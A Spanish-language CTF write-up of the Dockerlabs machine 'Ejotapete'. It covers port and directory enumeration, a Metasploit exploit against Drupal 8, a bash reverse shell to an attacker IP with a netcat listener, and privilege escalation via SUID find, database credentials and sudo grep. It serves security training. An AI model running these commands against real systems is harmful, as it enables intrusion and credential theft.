---
layout: single
title: Ejotapete: Dockerlabs
excerpt: "Se enumera la web sin hallar pistas claras, y se explota el servicio drupal v8 con Metasploit para obtener una reverse shell, se accede a un usuario con credenciales encontradas en la basededatos y, abusando de permisos sudo con grep, se lee un archivo que revela la contraseña de root."
date: 2025-10-07
classes: wide
header:
  teaser: /assets/images/dkl-writeup-ejotapete/logo_ejpt.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs.webp
categories:
  - Dockerlabs
  - Pentesting
  - eJPTv2
  - CMS
tags:
  - writeup
  - eJPTv2
  - HackingWeb
  - CMS-Drupal
  - Fuzzing
  - Metasploit
  - ReverseShell
  - RemoteAccessRCE
  - InformationLekeage
  - EscaladaPrivilegios
  - SUIDexplotation
  - Sudo
---

## WRITE UP
IP VÍCITMA-> 172.17.0.2 (TTL 64) LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Ejotapete</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Al ser dockerlabs, vamos a descargarnos el .zip y ejecutar el contenedor:

```bash
sudo bash auto_deploy.sh ejotapete.tar
```

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem 172.17.0.2
```

-Usar el comando *ping*:

```bash
ping 172.17.0.2 -c1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, nos muestra el proceso.
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oG allPorts
# Veremos porque el formato grapeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports allPorts
```

```bash
nmap -sVC -p80 172.17.0.2 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java.
```

### ANÁLISIS WEB: RECONOCIMIENTO

Si entramos a la página tendremos prohibido el acceso.

### ENUMERACIÓN DIRECTORIOS A NIVEL WEB

Con *gobuster* enumeraremos directorios a nivel web para encontrar algún recurso oculto.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php .html .xml .zip .txt-no-error -t 100
```

Encontraremos <span style="color:lightblue">/drupal</span>

>Sistema de Gestión de Contenidos (CMS) de código abierto que permite crear y administrar sitios web.

No nos deja interactuar con nada.

Haremos fuerza bruta otra vez, pero sobre dicha página.

```bash
gobuster dir -u http://172.17.0.2/drupal/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowecase-2.3-medium.txt -x .php .html .xml .zip .txt-no-error -t 100
```

Con la extensión <span style="color:lightyellow">Wappalyzer</span> vemos las tecnologías de la página:

Con *whatweb* haremos un pequeño reconocimiento a nivel web, igual al anterior pero por consola.

```bash
whatweb http://172.17.0.2/drupal/
```

### METASPLOIT: EXPLOIT DRUPAL

Con *Metasploit* buscaremos **drupal** ya que tenemos una versión que es la 8.X.
Usaremos el primer exploit ya que es excelente y suele funcionar.

```bash
# Abrir Metasploit
msfconsole

# Buscar módulo de drupla vulnerable v8
search drupal 8
```

Para ver los valores a configurar:

``show options``

Ponemos los valores y ejecutamos el exploit:

```bash
# Establecer valores: IP víctima Y URI(Raíz drupal)
set TARGETURI /drupal
set RHOSTS 172.17.0.2

# Ejecutar Exploit
run
```

### REVERSE SHELL

Pone que es vulnerable y recibiremos una Shell por el módulo **meterpreter**.
Nos daremos una *reverse shell* más deslimitada.

``shell``

Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> con *netcat* para cuando tengamos conexión con la víctima, recibiremos su shell en nuestor host.

```bash
nc -nvlp 444
```

Pondremos ``bash -c "bash -i >& /dev/tcp/10.0.2.15/444 0>&1"``

Recibiendo así la shell vícitima.

### TRATAMIENTO TTY

1) ``script /dev/null -c bash``

2) ``CTRL + Z``

3) ``stty raw -echo; fg``

4) ``reset xterm``

5) ``export TERM=xterm``

Ya tendremos una Shell totalmente interactiva.

### ESCALADA PRIVILEGIOS 1

Listamos nuestros permisos de sudo, no tenemos permisos suficientes para ejecutar el comando.

``sudo -l``

Listaremos los **SUID** que tenemos disponibles para ejecutar como root, y ver si nos podemos aprovechar de ellos.

Encontraremos uno <span style="color:lightblue">/usr/bin/</span>**find** , es vulnerable a *SUID (Set User ID) explotation*, es decir un binario tiene el bit suid activado así que si conseguimos abusar de el podemos escalar privilegios.

```bash
find / -perm -4000 2>/dev/null
```

Nos vamos al repositorio online : [GTFObins](https://gtfobins.github.io/)

<iframe src="https://gtfobins.github.io/gtfobins/find/" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

Ponemos el siguiente comando  para darnos una Shell de root:

```bash
find . -exec /bin/sh \; 
```

Nos cambiara el **guid** a root por ende tendremos permisos para entrar a directorios arbitrarios pero no a interactuar con archivos.

``root``

Entraremos a <span style="color:lightblue">root/</span> y veremos un archivo: secretitomaximo.txt

### ESCALADA PRIVILEGIOS 2

Para ser root de verdad en la ruta <span style="color:lightblue">/var/www/html/sites/default/</span><span style="color:grey">config.php</span> filtraremos por "password" y "databases con **grep**.

```bash
cat settings.php | grep -i "databases" "passwords"
```

Encontraremos las siguientes credenciales:

Nos quedaremos con la contraseña -> <span style="color:darkred">ballenitafeliz</span>

Veremos el home de un usuario que es <span style="color:blue">ballenita</span> cual coincide con la contraseña.

Probamos las credenciales, y son correctas.

```bash
su ballenita
-> ballenitafeliz
```

Listamos nuestros permisos de sudo, para ver si tenemos alguno disponible.

``sudo -l``

Tenemos uno con el binario **grep**

> Este permiso nos hará leer archivos arbitrarios sin necesidad de ser root.

<iframe src="https://gtfobins.github.io/gtfobins/grep/#sudo" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

Poniendo el siguiente comando le diremos que queremos leer los archivos en el lugar de la variable **$LFILE**

**LFILE=file_to_read**

Basándonos en la sintaxis -> **sudo grep '' $LFILE**

Entraremos al archivo visto anteriormente en el directorio root/ pero no podríamos leer.

```bash
sudo grep '' /root/secretitomaximo.txt
```

Conteniendo la contraseña: <span style="color:darkred">nobodycanfindthispasswordrootrocks</span>

Si probamos las credenciales con el usuario <span style="color:blue">root</span> vemos que tenemos privilegios máximos sobre el sistema y que somos dicho usuario.

```bash
su root
-> nobodycanfindthispasswordrootrocks
```

